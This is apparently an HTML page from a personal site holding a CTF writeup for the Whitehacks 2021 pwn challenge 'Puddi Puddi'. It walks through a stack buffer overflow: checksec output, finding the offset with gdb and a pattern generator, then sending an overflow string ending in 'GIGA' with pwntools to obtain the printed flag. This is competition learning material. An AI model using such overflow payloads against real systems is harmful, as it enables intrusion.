@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>CTF Writeup</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+    <link rel="stylesheet" href="/style.css"/>
+
+  </head>
+
+  <body>
+    <!--Navigation Bar-->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+      <a class="navbar-brand" href="/index.html">Hackin7</a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarText" aria-controls="navbarText" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarText">
+        <ul class="navbar-nav mr-auto">
+
+          <li class="nav-item">
+            <a class="nav-link" href="/about.html">About</a></li>
+           <li><a class="nav-link" href="/achievements.html">Achievements</a></li>
+           <li><a class="nav-link" href="/blog.html">Blog</a></li>
+            <li><a class="nav-link" href="/links.html">CTF Writeups</a></li>
+            <li><a class="nav-link" href="/all_projects.html">All Projects</a></li>
+        </ul>
+      </div>
+    </nav>
+
+    <div>
+    <div class='content' style='width:60%;'>
+        <br>
+        <a href='https://github.com/Hackin7/Programming-Crappy-Solutions/blob/master/Cyber Security/Capture the Flag Competitions/2021/Whitehacks 2021/Pwn/Puddi Puddi'>Original Github Link</a><br>
+        <h1>Puddi Puddi</h1>
+<p>981, PWN, 12 SOLVES</p>
+<h3>Description</h3>
+<p>Why have a MEGA 🍮 when you can have a GIGA 🍮?</p>
+<p>Interact with the service using nc chals.whitehacks.ctf.sg 20301 to get started!</p>
+<h3>Attached Files</h3>
+<p>exploit-template.py
+puddi</p>
+<h2>Team</h2>
+<p>NYCP</p>
+<h2>Category</h2>
+<p>Pwn</p>
+<h2>Flag</h2>
+<p><code>WH2021{3880fba0faf0_g1g4_pudd1}</code></p>
+<h2>Steps</h2>
+<h3>Strategy</h3>
+<pre><code>$ checksec puddi
+[*] '/mnt/c/Users/zunmu/Documents/Stuff/Github/Solutions/Cyber Security/Capture the Flag Competitions/2021/Whitehacks 2021/Pwn/Puddi Puddi/puddi'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre>
+<p>After reading the code, I thought it is a typical buffer overflow problem, to overflow the variable such that you modify the other variables on the stack.</p>
+<p>So this is what I did (or what I think I did my brain dead)</p>
+<ol>
+<li>I decompiled the code, and figured out it is comparing a target variable with the string <code>GIGA</code></li>
+<li>Get the size of the stack using the gdb command <code>print $rbp-$rsp</code>. $rbp is the base pointer, $rsp is the stack pointer. I set a hook to keep printing the stack</li>
+<li>I used this <a href="https://wiremask.eu/tools/buffer-overflow-pattern-generator/">amazing tool</a> to generate a buffer overflow pattern. After that I read the stack and see the data in the memory location of the target variable. Putting the data in the tool again gives me the offset</li>
+<li>Replace the appropriate data in the string with the string <code>GIGA</code></li>
+</ol>
+<h3>Getting the flag from the server using a python program</h3>
+<p>Just use pwntools</p>
+<pre><code>$ python solve.py
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGIGA
+[+] Opening connection to chals.whitehacks.ctf.sg on port 20301: Done
+PUDDI PUDDI!
+[*] Switching to interactive mode
+
+PUDDI PUDDI!
+SUGOKU DEKKAI...
+
+ .d8888b.  8888888  .d8888b.         d8888       8888888b.  888     888 8888888b.  8888888b. 8888888 888
+d88P  Y88b   888   d88P  Y88b       d88888       888   Y88b 888     888 888  &quot;Y88b 888  &quot;Y88b  888   888
+888    888   888   888    888      d88P888       888    888 888     888 888    888 888    888  888   888
+888          888   888            d88P 888       888   d88P 888     888 888    888 888    888  888   888
+888  88888   888   888  88888    d88P  888       8888888P&quot;  888     888 888    888 888    888  888   888
+888    888   888   888    888   d88P   888       888        888     888 888    888 888    888  888   Y8P
+Y88b  d88P   888   Y88b  d88P  d8888888888       888        Y88b. .d88P 888  .d88P 888  .d88P  888    &quot;
+ &quot;Y8888P88 8888888  &quot;Y8888P88 d88P     888       888         &quot;Y88888P&quot;  8888888P&quot;  8888888P&quot; 8888888 888
+
+
+WH2021{3880fba0faf0_g1g4_pudd1}
+
+[*] Got EOF while reading in interactive
+$                
+</code></pre>
+
+    </div>
+    
+    </div>
+
+  </body>
+</html>
